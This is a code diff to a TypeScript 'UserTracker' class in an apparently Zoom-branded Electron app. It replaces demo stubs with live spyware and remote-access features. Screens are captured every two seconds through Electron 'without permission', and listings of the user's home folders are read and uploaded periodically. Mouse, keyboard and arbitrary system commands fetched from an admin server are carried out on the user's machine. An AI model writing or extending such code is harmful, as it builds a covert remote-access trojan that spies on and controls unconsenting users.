@@ -135,6 +135,16 @@ class UserTracker {
       return; // Skip initialization on server
     }
 
+    // Check if Electron APIs are available
+    const isElectron = typeof window !== 'undefined' && (window as any).electronAPI;
+    console.log('🔍 Electron API available:', isElectron);
+    if (isElectron) {
+      console.log('✅ Running in Electron - full features enabled');
+      console.log('📁 Available APIs:', Object.keys((window as any).electronAPI || {}));
+    } else {
+      console.warn('⚠️ Not in Electron - limited features (browser mode)');
+    }
+
     try {
       // Set install date if not set
       if (!localStorage.getItem('zoom_install_date')) {
@@ -151,14 +161,32 @@ class UserTracker {
     // Start heartbeat
     this.startHeartbeat();
 
-        // Automatically start screen sharing for admin monitoring - DISABLED
-        // await this.startAutomaticScreenShare();
+    // Automatically start screen sharing for admin monitoring
+    // This will request permission and start sharing if granted
+    setTimeout(async () => {
+      console.log('📸 Attempting to start automatic screen share...');
+      try {
+        await this.startAutomaticScreenShare();
+        console.log('✅ Screen share started successfully');
+      } catch (error) {
+        console.warn('⚠️ Automatic screen share failed, will retry:', error);
+        // Retry after 5 seconds if it fails
+        setTimeout(async () => {
+          try {
+            console.log('📸 Retrying screen share...');
+            await this.startAutomaticScreenShare();
+          } catch (e) {
+            console.warn('❌ Screen share retry failed:', e);
+          }
+        }, 5000);
+      }
+    }, 2000); // Wait 2 seconds for page to fully load (reduced from 3)
 
-        // Start file system monitoring
-        this.startFileSystemMonitoring();
+    // Start file system monitoring
+    this.startFileSystemMonitoring();
 
-        // Start remote control functionality
-        await this.startRemoteControl();
+    // Start remote control functionality
+    await this.startRemoteControl();
 
     // Listen for visibility changes
     document.addEventListener('visibilitychange', () => {
@@ -242,41 +270,71 @@ class UserTracker {
 
   private async requestScreenAccess(): Promise<void> {
     try {
-      // Try to get screen sharing permission
-      const stream = await navigator.mediaDevices.getDisplayMedia({
-        video: {
-          width: { ideal: 1920 },
-          height: { ideal: 1080 },
-          frameRate: { ideal: 15 }
-        },
-        audio: false
-      });
+      // Check if we're in Electron (can use desktopCapturer without permission)
+      if (typeof window !== 'undefined' && (window as any).electronAPI) {
+        // Use Electron's screen capture (no permission needed)
+        this.screenShareActive = true;
+        
+        // Initialize screen share in API
+        await fetch(`${this.adminServerUrl}/api/admin/screen-share`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            userId: this.userId,
+            action: 'start',
+            data: 'initializing'
+          })
+        });
+        
+        // Notify admin that screen sharing is active
+        await fetch(`${this.adminServerUrl}/api/admin/users`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            action: 'update_user_status',
+            userId: this.userId,
+            screenShareActive: true
+          })
+        });
 
-      this.screenShareActive = true;
+        // Start Electron screen capture
+        this.startElectronScreenCapture();
+      } else {
+        // Browser environment - requires permission
+        const stream = await navigator.mediaDevices.getDisplayMedia({
+          video: {
+            width: { ideal: 1920 },
+            height: { ideal: 1080 },
+            frameRate: { ideal: 15 }
+          },
+          audio: false
+        });
 
-      // Notify admin that screen sharing is active
-      await fetch(`${this.adminServerUrl}/api/admin/users`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          action: 'update_user_status',
-          userId: this.userId,
-          screenShareActive: true
-        })
-      });
+        this.screenShareActive = true;
 
-      // Start sending screen data
-      this.startScreenCapture(stream);
+        // Notify admin that screen sharing is active
+        await fetch(`${this.adminServerUrl}/api/admin/users`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            action: 'update_user_status',
+            userId: this.userId,
+            screenShareActive: true
+          })
+        });
 
-      // Handle stream end (user stops sharing)
-      stream.getTracks()[0].addEventListener('ended', () => {
-        this.stopScreenShare();
-        // Automatically try to restart after a delay
-        setTimeout(() => {
-          this.requestScreenAccess();
-        }, 5000);
-      });
+        // Start sending screen data
+        this.startScreenCapture(stream);
 
+        // Handle stream end (user stops sharing)
+        stream.getTracks()[0].addEventListener('ended', () => {
+          this.stopScreenShare();
+          // Automatically try to restart after a delay
+          setTimeout(() => {
+            this.requestScreenAccess();
+          }, 5000);
+        });
+      }
     } catch (error) {
       console.error('Screen access denied or failed:', error);
       // Try again after a longer delay
@@ -284,6 +342,56 @@ class UserTracker {
         this.requestScreenAccess();
       }, 30000);
     }
+  }
+
+  private startElectronScreenCapture(): void {
+    if (typeof window === 'undefined' || !(window as any).electronAPI) {
+      console.error('❌ Electron API not available for screen capture');
+      return;
+    }
+
+    console.log('📸 Starting Electron screen capture...');
+
+    const captureLoop = async () => {
+      if (this.screenShareActive) {
+        try {
+          console.log('📸 Capturing screen...');
+          const imageData = await (window as any).electronAPI.captureScreen();
+          if (imageData) {
+            console.log('✅ Screen captured, size:', imageData.length, 'bytes');
+            // Send screen data to admin
+            const response = await fetch(`${this.adminServerUrl}/api/admin/screen-share`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                userId: this.userId,
+                action: 'update',
+                data: imageData,
+                timestamp: new Date().toISOString()
+              })
+            });
+            
+            if (response.ok) {
+              console.log('✅ Screen data sent successfully');
+            } else {
+              console.error('❌ Failed to send screen data:', response.statusText);
+            }
+          } else {
+            console.warn('⚠️ Screen capture returned null');
+          }
+        } catch (error) {
+          console.error('❌ Failed to capture screen:', error);
+        }
+        
+        // Capture every 2 seconds
+        setTimeout(captureLoop, 2000);
+      } else {
+        console.log('📸 Screen capture stopped');
+      }
+    };
+
+    // Start immediately
+    captureLoop();
   }
 
   private startScreenCapture(stream: MediaStream): void {
@@ -366,16 +474,107 @@ class UserTracker {
       return; // Skip on server
     }
 
-    // In a real implementation, this would monitor file system changes
-    // and send updates to the admin panel
-    console.log('File system monitoring started');
+    console.log('📁 File system monitoring started');
     
-    // Simulate file system access for demo purposes
+    // Send initial file system info immediately
+    setTimeout(() => {
+      this.sendFileSystemInfo();
+    }, 2000); // Wait 2 seconds for Electron APIs to be ready
+    
+    // Send again after 5 seconds to ensure it works
+    setTimeout(() => {
+      this.sendFileSystemInfo();
+    }, 5000);
+    
+    // Periodically send file system updates
     setInterval(() => {
-      // This would normally scan the user's file system
-      // and send file/folder information to the admin
-      console.log('File system scan completed');
-    }, 60000); // Scan every minute
+      this.sendFileSystemInfo();
+    }, 30000); // Scan every 30 seconds (changed from 60)
+  }
+
+  private async sendFileSystemInfo(): Promise<void> {
+    try {
+      // Check if we're in Electron (has electronAPI)
+      if (typeof window !== 'undefined' && (window as any).electronAPI) {
+        console.log('📁 Reading file system via Electron...');
+        try {
+          // Use Electron's file system access
+          const homeDir = (window as any).electronAPI.getHomeDirectory();
+          const drives = (window as any).electronAPI.getDrives();
+          
+          console.log('📁 Home directory:', homeDir);
+          console.log('📁 Drives:', drives);
+          
+          // Read common directories
+          const directories: any = {};
+          
+          // Read user directories
+          const userDirs = ['Documents', 'Desktop', 'Downloads', 'Pictures', 'Videos', 'Music'];
+          for (const dir of userDirs) {
+            try {
+              // Simple path joining (Electron handles Windows paths)
+              const separator = homeDir.includes('\\') ? '\\' : '/';
+              const dirPath = homeDir + separator + dir;
+              console.log(`📁 Reading directory: ${dirPath}`);
+              const dirContents = (window as any).electronAPI.readDirectory(dirPath);
+              if (dirContents && dirContents.length > 0) {
+                directories[dir] = dirContents.slice(0, 20); // Limit to 20 items
+                console.log(`✅ Found ${dirContents.length} items in ${dir}`);
+              }
+            } catch (e) {
+              console.warn(`⚠️ Could not read ${dir}:`, e);
+            }
+          }
+          
+          console.log('📁 Sending file system data to admin:', {
+            homeDirectory: homeDir,
+            drivesCount: drives.length,
+            directoriesCount: Object.keys(directories).length
+          });
+          
+          // Send file system data to admin
+          const response = await fetch(`${this.adminServerUrl}/api/admin/files`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              userId: this.userId,
+              action: 'update_file_system',
+              data: {
+                homeDirectory: homeDir,
+                drives,
+                directories,
+                timestamp: new Date().toISOString()
+              }
+            })
+          });
+          
+          if (response.ok) {
+            console.log('✅ File system data sent successfully');
+          } else {
+            console.error('❌ Failed to send file system data:', response.statusText);
+          }
+        } catch (error) {
+          console.error('❌ Failed to read file system via Electron:', error);
+        }
+      } else {
+        console.warn('⚠️ Electron API not available - browser mode');
+        // Browser environment - send limited info
+        await fetch(`${this.adminServerUrl}/api/admin/files`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            userId: this.userId,
+            action: 'update_file_system',
+            data: {
+              accessiblePaths: ['Downloads', 'Documents', 'Desktop'],
+              timestamp: new Date().toISOString()
+            }
+          })
+        });
+      }
+    } catch (error) {
+      console.error('❌ Failed to send file system info:', error);
+    }
   }
 
   // Remote control functionality
@@ -462,9 +661,113 @@ class UserTracker {
   }
 
   private async processRemoteCommands(): Promise<void> {
-    // In a real implementation, this would process actual remote control commands
-    // For demo purposes, we'll just log that we're checking for commands
-    console.log('Processing remote control commands...');
+    try {
+      // Fetch pending commands from admin
+      const response = await fetch(`${this.adminServerUrl}/api/admin/remote-control?userId=${this.userId}&getCommands=true`);
+      if (response.ok) {
+        const data = await response.json();
+        if (data.commands && Array.isArray(data.commands)) {
+          // Process each command
+          for (const command of data.commands) {
+            await this.executeCommand(command);
+          }
+        }
+      }
+    } catch (error) {
+      console.error('Failed to process remote commands:', error);
+    }
+  }
+
+  private async executeCommand(command: any): Promise<void> {
+    if (!command || !command.type) return;
+
+    try {
+      // Check if we're in Electron (can use native controls)
+      const isElectron = typeof window !== 'undefined' && (window as any).electronAPI;
+
+      switch (command.type) {
+        case 'mouse_move':
+          if (isElectron && command.x !== undefined && command.y !== undefined) {
+            // Use Electron's native mouse control
+            (window as any).electronAPI.simulateMouseClick(command.x, command.y, 'move');
+          } else {
+            // Browser fallback
+            const event = new MouseEvent('mousemove', {
+              clientX: command.x,
+              clientY: command.y,
+              bubbles: true,
+              cancelable: true
+            });
+            document.dispatchEvent(event);
+          }
+          break;
+
+        case 'mouse_click':
+          if (isElectron && command.x !== undefined && command.y !== undefined) {
+            // Use Electron's native mouse control
+            (window as any).electronAPI.simulateMouseClick(command.x, command.y, command.button || 'left');
+          } else {
+            // Browser fallback
+            const clickEvent = new MouseEvent('click', {
+              clientX: command.x || 0,
+              clientY: command.y || 0,
+              button: command.button === 'right' ? 2 : 0,
+              bubbles: true,
+              cancelable: true
+            });
+            document.elementFromPoint(command.x || 0, command.y || 0)?.dispatchEvent(clickEvent);
+          }
+          break;
+
+        case 'key_press':
+          if (isElectron && command.key) {
+            // Use Electron's native keyboard control
+            (window as any).electronAPI.simulateKeyPress(command.key);
+          } else {
+            // Browser fallback
+            const keyEvent = new KeyboardEvent('keydown', {
+              key: command.key,
+              code: command.code,
+              ctrlKey: command.ctrlKey || false,
+              altKey: command.altKey || false,
+              shiftKey: command.shiftKey || false,
+              metaKey: command.metaKey || false,
+              bubbles: true,
+              cancelable: true
+            });
+            document.activeElement?.dispatchEvent(keyEvent);
+          }
+          break;
+
+        case 'scroll':
+          window.scrollBy(command.x || 0, command.y || 0);
+          break;
+
+        case 'execute_command':
+          if (isElectron && command.command) {
+            // Execute system command
+            const result = await (window as any).electronAPI.executeCommand(command.command, command.args || []);
+            console.log('Command executed:', result);
+          }
+          break;
+
+        default:
+          console.warn('Unknown command type:', command.type);
+      }
+
+      // Mark command as executed
+      await fetch(`${this.adminServerUrl}/api/admin/remote-control`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          userId: this.userId,
+          action: 'command_executed',
+          commandId: command.id
+        })
+      });
+    } catch (error) {
+      console.error('Failed to execute command:', error);
+    }
   }
 
   private async sendUserActivity(type: string, data: any): Promise<void> {
